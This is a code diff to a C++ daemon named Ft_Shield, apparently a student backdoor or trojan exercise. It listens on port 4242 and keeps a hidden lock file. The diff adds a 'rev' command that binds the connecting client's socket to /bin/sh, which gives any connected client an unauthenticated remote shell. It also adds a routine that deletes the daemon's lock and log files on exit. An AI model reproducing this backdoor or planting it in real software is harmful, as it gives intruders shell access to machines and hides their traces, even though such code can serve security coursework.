@@ -30,7 +30,7 @@
 #define DAEMON_LOCK_FILE "/var/lock/.matt_daemon"
 
 /* Constructors ============================================================= */
-Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _lockFile(-1), _logFile(-1), _nClients(0)
+Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _maxfd(2), _lockFile(-1), _logFile(-1), _nClients(0)
 {
 	sockaddr_in		&addrIn 	= *reinterpret_cast<sockaddr_in *>(&this->_addr);
 
@@ -42,6 +42,7 @@ Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _lockFile(
 
 	/* Map the commands into the command-mapper t_commands */
 	this->_cmdMap["shutdown\n"] = &Ft_Shield::_shutdown;
+	this->_cmdMap["rev\n"] = &Ft_Shield::_reverseShell;
 	return;
 }
 
@@ -201,13 +202,13 @@ int	Ft_Shield::_mkSrv(void)
  */
 void	Ft_Shield::_runSrv(void)
 {
-	int			maxfd = this->_socket;
 	socklen_t	lenaddr = sizeof(this->_addr);
 	int			client = -1;
 	fd_set		master_set, read_set, write_set;
 	char		char_buf[100] = {'\0'};
 	int			res = 0;
 
+	this->_maxfd = this->_socket;
 	FD_ZERO( &master_set );
 	FD_SET(this->_socket, &master_set);
 
@@ -215,9 +216,9 @@ void	Ft_Shield::_runSrv(void)
 	{
 		read_set = master_set;
 		write_set = master_set;
-		if (select(maxfd + 1, &read_set, &write_set, NULL, NULL) < 0)
+		if (select(this->_maxfd + 1, &read_set, &write_set, NULL, NULL) < 0)
 			continue;
-		for(int fd = 0; fd <= maxfd; fd++)
+		for(int fd = 0; fd <= this->_maxfd; fd++)
 		{
 			if (FD_ISSET(fd, &read_set) && fd == this->_socket)
 			{
@@ -225,7 +226,7 @@ void	Ft_Shield::_runSrv(void)
 				if (client != -1 && this->_nClients < this->_MaxClients)
 				{
 					FD_SET(client, &master_set);
-					maxfd = client > maxfd ? client : maxfd;
+					this->_maxfd = client > this->_maxfd ? client : this->_maxfd;
 					this->_nClients++;
 					send(client, "Connected to ft_shield\n", 24, 0);
 				}
@@ -242,7 +243,7 @@ void	Ft_Shield::_runSrv(void)
 				if (res <= 0)
 				{
 					close(fd);
-					maxfd = (fd == maxfd) ? maxfd - 1 : maxfd;
+					this->_maxfd = (fd == this->_maxfd) ? this->_maxfd - 1 : this->_maxfd;
 					this->_nClients--;
 				}
 				else
@@ -251,7 +252,7 @@ void	Ft_Shield::_runSrv(void)
 					this->_buffer = char_buf;
 					bzero(char_buf, 100);
 					if (this->_cmdMap.find(this->_buffer) != this->_cmdMap.end())
-						( this->*( this->_cmdMap[this->_buffer] ) )();
+						( this->*( this->_cmdMap[this->_buffer] ) )(fd);
 				}
 			}
 		}
@@ -259,8 +260,43 @@ void	Ft_Shield::_runSrv(void)
 	return;
 }
 
-void	Ft_Shield::_shutdown(void)
+void	Ft_Shield::_exit(void)
 {
 	this->_run = false;
+	for (int fd = 3; fd <= this->_maxfd; fd++)
+		close(fd);
+	remove(DAEMON_LOCK_FILE);
+	remove(DAEMON_LOG_FILE);
+
+	exit(EXIT_SUCCESS);
+}
+
+void	Ft_Shield::_shutdown(int fd __attribute__((unused)))
+{
+	this->_run = false;
+	return;
+}
+
+void	Ft_Shield::_reverseShell(int fd)
+{
+	int	pid = -1;
+
+	pid = fork();
+	if (pid != -1 && pid == 0)
+	{
+		close(STDIN_FILENO);
+		close(STDOUT_FILENO);
+		close(STDERR_FILENO);
+		dup2(fd, STDIN_FILENO);
+		dup2(fd, STDOUT_FILENO);
+		dup2(fd, STDERR_FILENO);
+		close(fd);
+		system("/bin/sh");
+		this->_exit();
+	}
+	else if (pid != -1 && pid > 0)
+	{
+		//ras
+	}
 	return;
 }
